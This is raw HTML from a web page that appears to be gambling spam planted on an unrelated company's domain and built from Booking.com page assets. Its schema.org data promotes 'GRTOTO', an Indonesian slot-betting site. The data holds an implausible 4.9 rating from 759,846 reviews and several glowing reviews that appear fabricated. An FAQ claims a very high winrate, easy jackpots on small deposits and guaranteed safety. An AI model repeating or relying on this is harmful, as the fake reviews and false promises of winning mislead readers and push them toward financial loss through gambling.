e=0;e<c.length;e++)c[e].match(C)&&p.push(c[e])}for(let e=0;e<p.length;e++)window.PCM.__deleteCookie(p[e])}}}}},window.PCM),void 0===window.dataLayer&&(window.dataLayer=[]),s=function(){i&&n!==i?(window.addEventListener("message",function(e){e&&e.data&&"OneTrustCookies"===e.data.name&&Y(e.data.OptanonConsent,e.data.OptanonAlertBoxClosed)}),F(!1)):Y()},"loading"===document.readyState?document.addEventListener("DOMContentLoaded",function(){s()}):s()})();
</script>

        <script type="application/ld+json">
            {
            "@context": "https://schema.org",
            "@type": "BreadcrumbList",
            "itemListElement": [
                {
                "@type": "ListItem",
                "position": 1,
                "name": "GRTOTO",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 2,
                "name": "Jamu SLOT",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 3,
                "name": "SLOT GACOR",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 4,
                "name": "SLOT777",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 5,
                "name": "SLOT GACOR HARI INI",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 6,
                "name": "SLOT777 MAXWIN",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 7,
                "name": "SLOT ONLINE",
                "item": "https://nikoenergyltd.com/our-videos/"
                },
                {
                "@type": "ListItem",
                "position": 8,
                "name": "GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin",
                "item": "https://nikoenergyltd.com/our-videos/"
                }
            ]
            }
        </script>


        <script type="application/ld+json">
            {
            "@context": "https://schema.org",
            "@graph": [
                {
                "@type": "Product",
                "@id": "https://nikoenergyltd.com/our-videos/",
                "name": "GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin",
                "image": [
                    "https://veldrive.com/b3pYx8nb/sltgcr-js/rockincity-slot777.webp",
                    "https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg"
                ],
                "description": "GRTOTO hadir sebagai platform resmi bandar slot online hari ini, dirancang dengan keamanan terjamin supaya para pemain bisa menikmati permainan lebih nyaman..",
                "url": "https://nikoenergyltd.com/our-videos/",
                "brand": {
                    "@type": "Brand",
                    "name": "GRTOTO"
                },
                "offers": {
                    "@type": "Offer",
                    "priceCurrency": "IDR",
                    "price": "10000",
                    "availability": "https://schema.org/InStock",
                    "url": "https://nikoenergyltd.com/our-videos/"
                },
                "aggregateRating": {
                    "@type": "AggregateRating",
                    "ratingValue": "4.9",
                    "reviewCount": "759846"
                },
                "review": [
                  {
                    "@type": "Review",
                    "reviewBody": "Main di GRTOTO bikin ketagihan! Slot777 resmi gampang maxwin, putaran mulus, dan modal kecil tetap bisa tembus jackpot. Proses WD juga cepat tanpa ribet.",
                    "reviewRating": {
                      "@type": "Rating",
                      "ratingValue": "5",
                      "bestRating": "5"
                    },
                    "author": {
                      "@type": "Person",
                      "name": "Bella"
                    },
                    "datePublished": "2025-07-16"
                  },
                  {
                    "@type": "Review",
                    "reviewBody": "CS GRTOTO ramah dan profesional, siap membantu sampai beres. Deposit via QRIS lancar tanpa delay, cocok untuk yang ingin main santai tapi peluang maxwin tetap terbuka.",
                    "reviewRating": {
                      "@type": "Rating",
                      "ratingValue": "4.9",
                      "bestRating": "5"
                    },
                    "author": {
                      "@type": "Person",
                      "name": "Rara"
                    },
                    "datePublished": "2025-08-21"
                  },
                  {
                    "@type": "Review",
                    "reviewBody": "Tampilan GRTOTO ringan di HP dan cepat diakses. Bonus harian dan cashback siap menambah keseruan main slot gacor hari ini, pasti bikin puas setiap putaran.",
                    "reviewRating": {
                      "@type": "Rating",
                      "ratingValue": "4.8",
                      "bestRating": "5"
                    },
                    "author": {
                      "@type": "Person",
                      "name": "Lina"
                    },
                    "datePublished": "2025-09-28"
                  }
                ]
                }
            ]
            }
        </script>


    <script type="application/ld+json">
        {
        "@context": "https://schema.org",
        "@type": "SiteNavigationElement",
        "name": "GRTOTO",
        "url": "https://nikoenergyltd.com/our-videos/"
        }
    </script>


    <script type="application/ld+json">
        {
        "@context": "https://schema.org",
        "@type": "LocalBusiness",
        "name": "GRTOTO",
        "image": [
            "https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg"
        ],
        "url": "https://nikoenergyltd.com/our-videos/",
        "telephone": "+62-852-9841-2870",
        "priceRange": "IDR",
        "address": {
            "@type": "PostalAddress",
            "streetAddress": "Jl. Merpati No. 46",
            "addressLocality": "Kota Jakarta Selatan",
            "addressRegion": "DKI Jakarta",
            "postalCode": "12560",
            "addressCountry": "ID"
        },
        "sameAs": [
            "https://www.facebook.com/groups/GRTOTO",
            "https://x.com/GRTOTO",
            "https://linktr.ee/GRTOTO"
        ]
        }
    </script>
    
        <script type="application/ld+json">
            {
            "@context": "https://schema.org",
            "@type": "SiteNavigationElement",
            "name": "GRTOTO",
            "url": "https://nikoenergyltd.com/our-videos/"
            }
        </script>

    <script type="application/ld+json">
      {
        "@context": "https://schema.org",
        "@type": "FAQPage",
        "mainEntity": [
          {
            "@type": "Question",
            "name": "Apa itu GRTOTO Bandar Toto Slot Online Hari ini?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "GRTOTO merupakan bandar toto slot online resmi yang nawarin potensi raih maxwin hari ini. Hadirkan sistem premium dengan winrate kemenangan yang sangat tinggi, semua pengguna dapat menikmati setiap spin lebih optimal tanpa ribet."
            }
          },
          {
            "@type": "Question",
            "name": "Mengapa harus memilih GRTOTO?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "GRTOTO menawarkan berbagai keuntungan: proses deposit cepat via QRIS, WD instan, bonus harian, dan fitur slot gacor yang siap meningkatkan peluang menang. Cocok buat pemain baru maupun yang sudah berpengalaman."
            }
          },
          {
            "@type": "Question",
            "name": "Apakah GRTOTO aman dan terpercaya?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "Sangat aman. GRTOTO menggunakan teknologi enkripsi terbaru, server stabil, serta tim CS 24 jam siap membantu pemain. Semua transaksi dan data dijaga dengan ketat agar pengalaman bermain tetap nyaman."
            }
          },
          {
            "@type": "Question",
            "name": "Berapa minimal deposit di GRTOTO?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "Mulai dari Rp5.000 saja, kamu sudah bisa menikmati berbagai game slot gacor dengan peluang maxwin tinggi. Modal kecil tetap bisa meraih kemenangan besar setiap hari."
            }
          },
          {
            "@type": "Question",
            "name": "Apa keunggulan GRTOTO dibanding situs slot lain?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "Keunggulan GRTOTO meliputi RTP tinggi, koleksi game lengkap, server stabil, fitur prediksi dan statistik untuk membantu menang, serta bonus dan promo rutin yang menambah keseruan bermain slot gacor."
            }
          }
        ]
      }
    </script>


<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/core-deps-inlinedet_cloudfront_sd/f62025e692b596dd53ecd1bd082dfd3197944c50.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/jquery_cloudfront_sd/e1e8c0e862309cb4caf3c0d5fbea48bfb8eaad42.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/main_min_cloudfront_sd/1d4f585b8eee6165a358c63369b1963241618e65.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/main_cloudfront_sd/7d3fe39bc2dfe5fb6e218d630fc87193c54b6148.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/searchbox_cloudfront_sd/b3c5d3f7069cc96a4a9015a241a291577359e7af.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/hotel_cloudfront_sd/416f72c49d5bd49c421a1ac400af960942122346.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/hotel_experiments_rtrw_cloudfront_sd/11648e40bde3c51d7e9e18d5f976ef5e80e90fb0.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="preload" as="script" href="https://cf.bstatic.com/static/js/error_catcher_bec_cloudfront_sd/c40c55637440286271899bb4294fd743b387ac07.js" crossorigin nonce="cH3DZKVyvb8x5Uh">
<link rel="stylesheet" href="https://cf.bstatic.com/static/css/main_exps_cloudfront_sd.iq_ltr/b08056dddfe104d80d02a68b00266d52e048dd7b.css"  />
<link rel="stylesheet" href="https://cf.bstatic.com/static/css/gprof_icons_cloudfront_sd.iq_ltr/308436ca26aacf6a7553e4c0cf298d0f780727a2.css" /> 
<link rel="stylesheet" type="text/css" href="https://cf.bstatic.com/static/css/hotel_base_cloudfront_sd.iq_ltr/1fef5dcd999dda5d1075f923718cc9b5e4940564.css"  media="screen" />
<link rel="stylesheet" type="text/css" href="https://cf.bstatic.com/static/css/hotel_experiments_cloudfront_sd.iq_ltr/dd870c810c87782678534a31521242d8e1c2c4c4.css"  media="screen" />
<link rel="stylesheet" type="text/css" href="https://cf.bstatic.com/static/css/hotel_experiments_rtrw_cloudfront_sd.iq_ltr/de14ff1f714fe0123b06dd1f49088fac1cb77bb9.css"  media="screen" />
<link rel="stylesheet" type="text/css" href="https://cf.bstatic.com/static/css/xp-isolated-sb_cloudfront_sd.iq_ltr/f872fbfecf0fa83c3ec5ab40244bad20af3058d9.css" media="screen, print" />
<link rel="stylesheet" type="text/css" href="https://cf.bstatic.com/static/css/incentives_cloudfront_sd.iq_ltr/f1558a6e9832a4eb8cfe1d3d14db176bd3564335.css"  media="screen" />
<link rel="stylesheet" href="https://cf.bstatic.com/static/css/mlt_cloudfront_sd.iq_ltr.css" />
<link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/client.72757f30.css" data-chunk="client" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/client.72757f30.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/6e375f45.4c21d6df.chunk.css" data-chunk="bPropertyWebPropertyPage-PropertyTripPromotionsBadge" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/6e375f45.4c21d6df.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/91efc030327.112812e7.chunk.css" data-chunk="bPropertyWebPropertyPage-components-FXDisclaimerConverted" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/91efc030327.112812e7.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/7be52e7b.18f28db0.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyGalleryDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/7be52e7b.18f28db0.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/8e569b23.61256295.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyGalleryGridViewModal" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/8e569b23.61256295.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/9ac9834f.a349576a.chunk.css" data-chunk="bPropertyWebPropertyPage-components-Map-MapDesktop-Map" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/9ac9834f.a349576a.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/9e5951df.d5f9984a.chunk.css" data-chunk="bPropertyWebPropertyPage-components-MapEntryPointDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/9e5951df.d5f9984a.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/c009a34e.b848bc99.chunk.css" data-chunk="bPropertyWebPropertyPage-bookingcom-checkout-bp-accommodation-components-PriceMatch-PriceMatch" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/c009a34e.b848bc99.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/11334689.eeac9fd4.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PromotionalRegions-PromotionalRegionDesktop-renderers-PromotionalRegionOneDesktopRenderer" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/11334689.eeac9fd4.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/f5af45d7.eeac9fd4.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PromotionalRegions-PromotionalRegionDesktop-renderers-PromotionalRegionOneDesktopGeniusRenderer" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/f5af45d7.eeac9fd4.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/5de579b9.5e6c3617.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyBrandInfo-PropertyBrandInfo" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/5de579b9.5e6c3617.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/2b8df162.fa8d5512.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyChildPolicies-PropertyChildPolicies" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/2b8df162.fa8d5512.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/fbca8bad.66b1e001.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyDescription-PropertyDescriptionDesktop-PropertyDescriptionDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/fbca8bad.66b1e001.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/79b5a146.5cc84a17.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyGallerySidebarReviewsDesktop-PropertyGallerySidebarReviewsDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/79b5a146.5cc84a17.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/7273e3a1.6773699d.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyHeaderAddress-Desktop-PropertyHeaderAddress" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/7273e3a1.6773699d.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/51190c07.aba91bef.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyHeaderName-PropertyHeaderName" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/51190c07.aba91bef.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/db46a508.6786724e.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyHeaderNavbar-Desktop-PropertyHeaderNavbar" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/db46a508.6786724e.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/037d4f1a.a7b1264b.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyHighlights-PropertyHighlights" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/037d4f1a.a7b1264b.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/16d0c18c.72ed2d4b.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyImageGalleryReviews" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/16d0c18c.72ed2d4b.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/00e71363.2dea5f11.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyInferredLocationScore" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/00e71363.2dea5f11.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/d703c930.edd6867c.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyMostPopularFacilities-PropertyMostPopularFacilitiesDesktop-PropertyMostPopularFacilities" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/d703c930.edd6867c.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/232069f7.c48b51b0.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyReviewGuidelines-PropertyReviewGuidelines" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/232069f7.c48b51b0.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/6e97451b.a2cd61e1.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyReviewScore-PropertyReviewScoreRight" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/6e97451b.a2cd61e1.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/b7d32ec3.13e003ac.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyReviewSubscoresPanel-PropertyReviewSubscoresPanel" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/b7d32ec3.13e003ac.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/195efcdb.3ad72e37.chunk.css" data-chunk="bPropertyWebPropertyPage-PropertyReviewsTabDesktopOriginal" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/195efcdb.3ad72e37.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/f7bdfc98.265f2a5f.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertySectionsBelowRoomsTable" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/f7bdfc98.265f2a5f.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/21f1fc11.0de88cd6.chunk.css" data-chunk="bPropertyWebPropertyPage-SustainabilityBanner-SustainabilityBannerDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/21f1fc11.0de88cd6.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/5075d9e8.9934a39e.chunk.css" data-chunk="bPropertyWebPropertyPage-PromotionalRegions-PromotionalRegionDesktop-renderers-PromotionalRegionTwoDesktopRenderer" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/5075d9e8.9934a39e.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/fbebfdab.9167c2ab.chunk.css" data-chunk="bPropertyWebPropertyPage-PropertyLocationBlock-PropertyLocationBlockDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/fbebfdab.9167c2ab.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/2a4877b2.d2d5e800.chunk.css" data-chunk="bPropertyWebPropertyPage-Mvrex-carousels-SimilarPropertiesCarousel-SimilarPropertiesCarouselAvailable" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/2a4877b2.d2d5e800.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/ac8c03a1.cea3ef83.chunk.css" data-chunk="bPropertyWebPropertyPage-HouseRules-HouseRules" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/ac8c03a1.cea3ef83.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/2cea9793.13d7217b.chunk.css" data-chunk="bPropertyWebPropertyPage-PropertyFinePrint-PropertyFinePrint" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/2cea9793.13d7217b.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/9248d82a.d39ccbfa.chunk.css" data-chunk="bPropertyWebPropertyPage-TraderInformation" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/9248d82a.d39ccbfa.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/538e3f03.88595ae7.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyShare-PropertyShareDesktop-PropertyShareDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/538e3f03.88595ae7.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/00f0620c.917a140f.chunk.css" data-chunk="bPropertyWebPropertyPage-components-PropertyWriteReview-PropertyWriteReview" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/00f0620c.917a140f.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/35f723e7.09b2d1e5.chunk.css" data-chunk="bPropertyWebPropertyPage-components-RoomTable-RoomPage-RoomPageBase" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/35f723e7.09b2d1e5.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/532cdb87.5973d17b.chunk.css" data-chunk="bPropertyWebPropertyPage-components-RoomTable-Desktop-RoomTableBase" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/532cdb87.5973d17b.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/f0477014.e9c2d7f5.chunk.css" data-chunk="bPropertyWebPropertyPage-bookingcom-search-web-searchresults-components-SearchBoxDesktopHorizontal-SearchBoxDesktopHorizontal" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/f0477014.e9c2d7f5.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/44d0a763.b4adee83.chunk.css" data-chunk="bPropertyWebPropertyPage-bookingcom-search-web-searchresults-components-SearchBoxDesktopChangeDates-SearchBoxDesktopChangeDates" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/44d0a763.b4adee83.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/1fd362a4.d2d5e800.chunk.css" data-chunk="bPropertyWebPropertyPage-components-Mvrex-carousels-SimilarPropertiesCarousel-SimilarPropertiesCarouselNotAvailable" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/1fd362a4.d2d5e800.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/43032106.de80c974.chunk.css" data-chunk="bPropertyWebPropertyPage-components-SustainabilityBadge-SustainabilityBadge" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/43032106.de80c974.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/42ba0fc1.0de88cd6.chunk.css" data-chunk="bPropertyWebPropertyPage-components-SustainabilityBanner-SustainabilityBannerDesktop-SustainabilityBannerDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/42ba0fc1.0de88cd6.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/8094fb6a.b4a158f4.chunk.css" data-chunk="bPropertyWebPropertyPage-components-UkraineWarningBanner-UkraineWarningBanner" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/8094fb6a.b4a158f4.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/ee58a99f.c6ed3226.chunk.css" data-chunk="bPropertyWebPropertyPage-PropertyQuestionsAnswers-PropertyQuestionsAnswersDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/ee58a99f.c6ed3226.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/6bba6211.069a8cf3.chunk.css" data-chunk="bPropertyWebPropertyPage-PropertyMatchmakingQuestionsAnswersDesktop" rel="stylesheet" href="https://cf.bstatic.com/psb/capla/static/css/6bba6211.069a8cf3.chunk.css"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/b9a82cb8.df2bad89.chunk.css" data-chunk="bWebShellComponents-bWebShellComponents-GlobalAlerts" href="https://cf.bstatic.com/psb/capla/static/css/b9a82cb8.df2bad89.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/81da5f32.e4a2e0d3.chunk.css" data-chunk="bWebShellComponents-bWebShellComponents-AccommodationFooter" href="https://cf.bstatic.com/psb/capla/static/css/81da5f32.e4a2e0d3.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/dc32f6b7.3efb357c.chunk.css" data-chunk="bWebShellComponents-bWebShellComponents-AccommodationHeader" href="https://cf.bstatic.com/psb/capla/static/css/dc32f6b7.3efb357c.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/be127943.f77efbc8.chunk.css" data-chunk="bWishlistWishlistCs-bWishlistWishlistCs-WishlistWidgetPpHighlights" href="https://cf.bstatic.com/psb/capla/static/css/be127943.f77efbc8.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/6b97af9b.f77efbc8.chunk.css" data-chunk="bWishlistWishlistCs-bWishlistWishlistCs-WishlistWidgetPp" href="https://cf.bstatic.com/psb/capla/static/css/6b97af9b.f77efbc8.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/c26a6947.80c171a1.chunk.css" data-chunk="bGeniusVipWebComponentService-bGeniusVipWebComponentService-GeniusPlusProgramModeWelcomeSheet" href="https://cf.bstatic.com/psb/capla/static/css/c26a6947.80c171a1.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/7819cdf7.80c171a1.chunk.css" data-chunk="bGeniusVipWebComponentService-bGeniusVipWebComponentService-GeniusPlusSheetsPP" href="https://cf.bstatic.com/psb/capla/static/css/7819cdf7.80c171a1.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/09fb2abd.80c171a1.chunk.css" data-chunk="bGeniusVipWebComponentService-bGeniusVipWebComponentService-GeniusVipVoucherSheet" href="https://cf.bstatic.com/psb/capla/static/css/09fb2abd.80c171a1.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/dd79016c.ddbc31e3.chunk.css" data-chunk="bSurveyTrackerComponentService-bSurveyTrackerComponentService-SurveyTrackerV3" href="https://cf.bstatic.com/psb/capla/static/css/dd79016c.ddbc31e3.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/7e8161ba.77bbb250.chunk.css" data-chunk="bMarketingRewardsUiWebComponentService-bMarketingRewardsUiWebComponentService-RewardsFunnelBannerAndLandSheet" href="https://cf.bstatic.com/psb/capla/static/css/7e8161ba.77bbb250.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/0232f70e.0a2e8637.chunk.css" data-chunk="bSeoCoreComponents-bSeoCoreComponents-PropertyPageFAQ" href="https://cf.bstatic.com/psb/capla/static/css/0232f70e.0a2e8637.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/c7d35f92.527bde91.chunk.css" data-chunk="bSeoCoreComponents-bSeoCoreComponents-PropertyPageInterlinking" href="https://cf.bstatic.com/psb/capla/static/css/c7d35f92.527bde91.chunk.css" type="text/css" rel="stylesheet"><link nonce="cH3DZKVyvb8x5Uh" data-href="static/css/8f3c8312.acc43476.chunk.css" data-chunk="bSeoMetaComponentService-bSeoMetaComponentService-PropertyPageBreadcrumbs" href="https://cf.bstatic.com/psb/capla/static/css/8f3c8312.acc43476.chunk.css" type="text/css" rel="stylesheet">
</head>
<body
data-bui-theme="traveller_ex-light"
id="b2hotelPage"
class="bookings2 b2 hotel id lang_is_ltr header_reshuffle no_bg_img nobg user_center app_user_center sb_gradient_border b-sprite-3 ds-traveller-header bigblue_std_sm bigblue_std_lg iconfont_is_loading  hp_wishlists_bo_2 a11y-facilities-contrast system-font iq-x-bar iq-x-bar-new ">
<div class="bypass_menu" tabindex="0">
<a href="#basiclayout" class="bui-list-item" tabindex="0">
<div class="bui-inline-container bui-inline-container--align bui-inline-container--size-small">
<div class="bui-inline-container__main">Langsung ke konten utama</div>
</div>
</a>
</div>
<div data-bui-theme="traveller_ex-light" >
<div data-capla-component-boundary="b-property-web-property-page/TravellerHeader">
<div class="web-shell-header-mfe e661b22b91 a39fb30ec1" data-testid="web-shell-header-mfe">
<header class=" Header_root"><div class="b7ef425131"><nav class="Header_bar">
<div class="Header_main"><div class="Header_logo"><span data-testid="header-logo">
<a data-testid="header-booking-logo" aria-label="Booking.com" href="https://www.booking.com/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 180 30"><path fill="#fff" d="M70.6 2.73999C70.602 2.19808 70.7646 1.66892 71.0673 1.21943C71.3701 0.769947 71.7993 0.420321 72.3007 0.214768C72.8021 0.00921437 73.3532 -0.0430342 73.8843 0.064629C74.4155 0.172292 74.9027 0.435032 75.2845 0.819622C75.6663 1.20421 75.9255 1.69338 76.0293 2.22527C76.133 2.75716 76.0768 3.30788 75.8676 3.80779C75.6584 4.3077 75.3056 4.73434 74.8539 5.03377C74.4022 5.3332 73.8719 5.49197 73.33 5.48999C72.9702 5.48868 72.6141 5.41651 72.2822 5.2776C71.9503 5.13869 71.649 4.93576 71.3955 4.6804C71.1419 4.42504 70.9412 4.12225 70.8047 3.78931C70.6683 3.45637 70.5987 3.09982 70.6 2.73999V2.73999ZM116.5 23.77C117.044 23.772 117.577 23.6124 118.031 23.3114C118.484 23.0104 118.838 22.5816 119.048 22.0793C119.257 21.577 119.313 21.0238 119.208 20.4897C119.103 19.9555 118.842 19.4646 118.458 19.079C118.074 18.6934 117.584 18.4305 117.05 18.3236C116.516 18.2167 115.963 18.2705 115.46 